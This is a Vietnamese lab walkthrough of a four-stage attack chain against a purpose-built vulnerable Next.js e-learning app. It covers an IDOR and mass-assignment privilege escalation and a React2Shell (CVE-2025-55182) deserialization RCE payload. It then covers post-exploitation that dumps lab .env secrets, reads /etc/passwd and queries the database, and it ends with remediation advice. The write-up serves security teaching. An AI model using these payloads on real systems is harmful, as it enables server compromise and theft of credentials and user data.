# 📚 Hướng Dẫn Thực Hành Chi Tiết (Lab Walkthrough): React2Shell (CVE-2025-55182)

## 1. Mục Tiêu Bài Lab & Tổng Quan Kỹ Thuật

**The Academic Curator** là nền tảng quản lý học tập điện tử phát triển trên nền tảng Next.js 15.0.3 và React 19.0.0-rc. Mục tiêu của bài thực hành này là hoàn thành chuỗi khai thác an ninh 4 giai đoạn liên hoàn (**End-to-End Cyber Kill Chain**):
1. **Giai đoạn 1 (Initial Access)**: Đăng nhập hoặc đăng ký tài khoản sinh viên để thu thập phiên làm việc hợp lệ qua NextAuth v5.
2. **Giai đoạn 2 (Privilege Escalation)**: Khai thác kết hợp lỗ hổng Tham chiếu đối tượng trực tiếp không an toàn (**IDOR**) và Gán thuộc tính hàng loạt (**Mass Assignment**) trên Server Action `updateUserProfile` để nâng quyền lên Giảng viên (`LECTURER`).
3. **Giai đoạn 3 (Framework-Level RCE)**: Khai thác lỗ hổng Giải mã đối tượng không an toàn (**Insecure Deserialization - CVE-2025-55182 / React2Shell**) trên giao thức React Server Components Flight Stream tại Server Action `createAssignment` để thực thi mã tùy ý (RCE) trên máy chủ Node.js.
4. **Giai đoạn 4 (Post-Exploitation & Pivoting)**: Trích xuất bí mật hệ thống từ tệp `.env`, thu thập thông tin xác thực cơ sở dữ liệu nội bộ và truy vấn trực tiếp container PostgreSQL (`elearning-db`).

---

## 2. Thông Tin Môi Trường & Tài Khoản Thử Nghiệm

- **Địa chỉ máy chủ mục tiêu**: `http://localhost:3000` (hoặc `http://<TARGET_IP>:3000`)
- **Tài khoản Sinh viên (Student)**: `student@elearning.com` / `password123`
- **Tài khoản Giảng viên (Lecturer)**: `lecturer@elearning.com` / `password123`
- **Tài khoản Quản trị viên (Admin)**: `admin@elearning.com` / `password123`
- **Dịch vụ Cơ sở dữ liệu nội bộ**: `elearning-db:5432` (`postgres:16-alpine`)

---

## 3. Giai Đoạn 1: Truy Cập Ban Đầu & Thu Thập Phiên Làm Việc

NextAuth v5 áp dụng cơ chế bảo vệ CSRF theo mô hình Double Submit Cookie. Để đăng nhập qua API, ta cần trích xuất đồng thời mã token CSRF và cookie chữ ký.

### Bước 1.1: Trích xuất Token CSRF và Cookie
Gửi yêu cầu HTTP GET đến endpoint CSRF của NextAuth và lưu cookie vào tệp `cookies.txt`:
```bash
curl -i -s -c cookies.txt http://localhost:3000/api/auth/csrf
```
*Phản hồi mẫu từ máy chủ:*
```http
Set-Cookie: authjs.csrf-token=bb2b5d2baeae0a109c173617582d978bfbc7b187aad5333bd4ad314e7c5eb80c%7Cfdb959ea3846bed8b5f94de93e26f983dddb24c9d72f5862a46ee84e37756f92; Path=/; HttpOnly; SameSite=Lax
{"csrfToken":"bb2b5d2baeae0a109c173617582d978bfbc7b187aad5333bd4ad314e7c5eb80c"}
```

### Bước 1.2: Đăng nhập bằng Tài khoản Sinh viên
Gửi yêu cầu POST chứa `csrfToken` cùng thông tin đăng nhập:
```bash
CSRF_TOKEN="bb2b5d2baeae0a109c173617582d978bfbc7b187aad5333bd4ad314e7c5eb80c"

curl -i -s -b cookies.txt -c cookies.txt \
  -d "csrfToken=${CSRF_TOKEN}&email=student@elearning.com&password=password123" \
  http://localhost:3000/api/auth/callback/credentials
```
*Kết quả:* Máy chủ trả về HTTP 302 Found và thiết lập cookie phiên `authjs.session-token` (mã hóa JWE chứa vai trò `role: "STUDENT"`).

### Bước 1.3: Trích xuất User ID (CUID) của Sinh viên
Truy cập trang cài đặt hồ sơ sinh viên để lấy định danh CUID:
```bash
curl -s -b cookies.txt http://localhost:3000/student/settings | grep -o 'value="cmt[a-zA-Z0-9]*"'
```
*Kết quả đầu ra:* `value="cmt8y3z4e0002kcbrwl8eq5bt"` (CUID của tài khoản sinh viên).

---

## 4. Giai Đoạn 2: Leo Thang Đặc Quyền (IDOR + Mass Assignment)

### Bước 2.1: Phân tích Nguyên nhân Lỗ hổng
Tại tệp mã nguồn `lib/actions/user.ts`, Server Action `updateUserProfile(userId, updateData)` có hai điểm yếu an ninh:
1. **IDOR**: Hàm không kiểm tra tính tương đương giữa `session.user.id` của người gọi và `userId` mục tiêu.
2. **Mass Assignment**: Dữ liệu `updateData` được gán trực tiếp (`...updateData`) vào câu lệnh cập nhật `prisma.user.update` mà không có schema lọc (whitelist), cho phép ghi đè trường `role`.

### Bước 2.2: Xác định Server Action ID
Trong Next.js 15, mỗi Server Action được gán một Action ID duy nhất dạng băm SHA-1:
- Action ID của `updateUserProfile`: `0003834fbecc7cc1359c9730a8fda880e2b5306d07` (trích xuất từ `.next/server/server-reference-manifest.json`).

### Bước 2.3: Gửi Gói Tin Khai Thác Leo Thang Đặc Quyền
Gửi yêu cầu HTTP POST Server Action chứa payload chèn `"role": "LECTURER"`:
```bash
curl -i -s -b cookies.txt -c cookies.txt \
  -H "Host: localhost:3000" \
  -H "Origin: http://localhost:3000" \
  -H "Next-Action: 0003834fbecc7cc1359c9730a8fda880e2b5306d07" \
  -F '0=["cmt8y3z4e0002kcbrwl8eq5bt",{"email":"student@elearning.com","role":"LECTURER"}]' \
  http://localhost:3000/student/settings
```
*Kết quả:* Cơ sở dữ liệu cập nhật trường `role` của sinh viên thành `LECTURER`.

### Bước 2.4: Tái Xác Thực Để Cập Nhật Token Phiên
Đăng nhập lại để kích hoạt callback JWT nạp quyền mới từ cơ sở dữ liệu:
```bash
CSRF_TOKEN=$(curl -s -b cookies.txt http://localhost:3000/api/auth/csrf | grep -o '"csrfToken":"[^"]*"' | cut -d'"' -f4)

curl -i -s -b cookies.txt -c cookies.txt \
  -d "csrfToken=${CSRF_TOKEN}&email=student@elearning.com&password=password123" \
  http://localhost:3000/api/auth/callback/credentials
```

Kiểm tra quyền truy cập vào khu vực dành riêng cho Giảng viên:
```bash
curl -s -b cookies.txt -o /dev/null -w "%{http_code}\n" http://localhost:3000/lecturer/assignments
```
*Kết quả trả về:* `200` OK (đã có đầy đủ đặc quyền Giảng viên).

---

## 5. Giai Đoạn 3: Thực Thi Mã Từ Xa (React2Shell - CVE-2025-55182)

### Bước 5.1: Cơ Chế Phân Giải Đối Tượng Trong React Flight Protocol
Trong các phiên bản tồn tại lỗ hổng của `react-server-dom-webpack` (`< 19.0.1`), bộ phân giải stream Flight (`parseModelString` / `getOutlinedModel`) cho phép truy vết thuộc tính đối tượng phân cách bằng dấu hai chấm (`:`).

Cấu trúc luồng khai thác:
- **Chunk 1**: Định nghĩa Server Reference mô tả Server Action `createAssignment` (Action ID: `408c92d53a78edb220ec3787802802d39f9d02e4cf`).
- **Chunk 2**: Chuỗi `$F1` yêu cầu máy chủ phân giải module export của Server Action (trả về hàm `AsyncFunction: createAssignment`).
- **Chunk 0**: Sử dụng đường dẫn thuộc tính `"$2:constructor:constructor"` để truy vết ngược qua chuỗi prototype:
  $$\text{createAssignment} \xrightarrow{\text{.constructor}} \text{AsyncFunction} \xrightarrow{\text{.constructor}} \mathbf{Function}$$

Hàm khởi tạo `Function` của Node.js runtime được phân giải trực tiếp và liên kết với mã thực thi tùy ý.

### Bước 5.2: Gửi Payload Khai Thác RCE
Gửi HTTP POST multipart request chứa chuỗi stream Flight Protocol:
```bash
curl -i -s -b cookies.txt \
  -H "Host: localhost:3000" \
  -H "Origin: http://localhost:3000" \
  -H "Next-Action: 408c92d53a78edb220ec3787802802d39f9d02e4cf" \
  -F '0=[{"title":"PoC","dueDate":"2026-09-01","dueTime":"23:59","metadata":{"exploit":"$2:constructor:constructor"}}]' \
  -F '1={"id":"408c92d53a78edb220ec3787802802d39f9d02e4cf","bound":null}' \
  -F '2="$F1"' \
  http://localhost:3000/lecturer/assignments
```

---

## 6. Giai Đoạn 4: Khai Thác Hậu Xâm Nhập & Pivoting Nội Bộ

### Bước 6.1: Đọc Biến Môi Trường Hệ Thống
Trích xuất tệp `.env` để thu thập cấu hình kết nối cơ sở dữ liệu và khóa bí mật:
- `DATABASE_URL`: `postgresql://postgres:postgres123@elearning-db:5432/elearning_db?schema=public`
- `AUTH_SECRET`: `f4_igYGrQwVoTeMuCtbo6eUcayGV5m5Eg__tuWigngcKQuKJ02ZG9xcjrtkvFgOplWevvblkn2NyGfJtyclKX5Q=`
- `DB_INTERNAL_HOST`: `elearning-db`

### Bước 6.2: Truy Vấn Cơ Sở Dữ Liệu PostgreSQL Nội Bộ
Kết nối trực tiếp vào container cơ sở dữ liệu `elearning-db:5432`:
```bash
docker exec -it elearning-db psql -U postgres -d elearning_db -c 'SELECT id, email, role FROM "User";'
```

*Dữ liệu trích xuất:*
```text
            id            |          email          |   role   
--------------------------+-------------------------+----------
 cmt8y3z4b0000kcbrgq81x8pz | admin@elearning.com     | ADMIN
 cmt8y3z4c0001kcbreyc89tz9 | lecturer@elearning.com  | LECTURER
 cmt8y3z4e0002kcbrwl8eq5bt | student@elearning.com   | LECTURER
(3 rows)
```

---

## 7. Khai Thác Tự Động Hóa Trọn Gói Bằng Python

Toàn bộ 4 giai đoạn tấn công đã được tích hợp hoàn chỉnh trong script Python:

```bash
# Thực thi chuỗi tấn công tự động với lệnh mặc định (id && uname -a)
python3 scripts/exploit_react2shell.py --target http://localhost:3000

# Thực thi lệnh tùy ý trên máy chủ
python3 scripts/exploit_react2shell.py --target http://localhost:3000 --cmd "id && cat /etc/passwd"
```

---

## 8. Giải Pháp Khắc Phục & Phòng Thủ Chiều Sâu

1. **Nâng cấp Thư viện & Framework**: Cập nhật `react`, `react-dom`, `react-server-dom-webpack` lên phiên bản $\ge 19.0.1$ và Next.js lên phiên bản $\ge 15.1.0$.
2. **Kiểm tra Dữ liệu Đầu vào (Zod Validation)**: Áp dụng schema kiểm tra kiểu dữ liệu nghiêm ngặt cho toàn bộ Server Actions, chỉ cho phép cập nhật các trường được định nghĩa trước (whitelist DTO).
3. **Kiểm soát Quyền Sở hữu Phiên (Session Ownership Verification)**: Đảm bảo `session.user.id === targetUserId` trên tất cả các thao tác thay đổi dữ liệu người dùng.
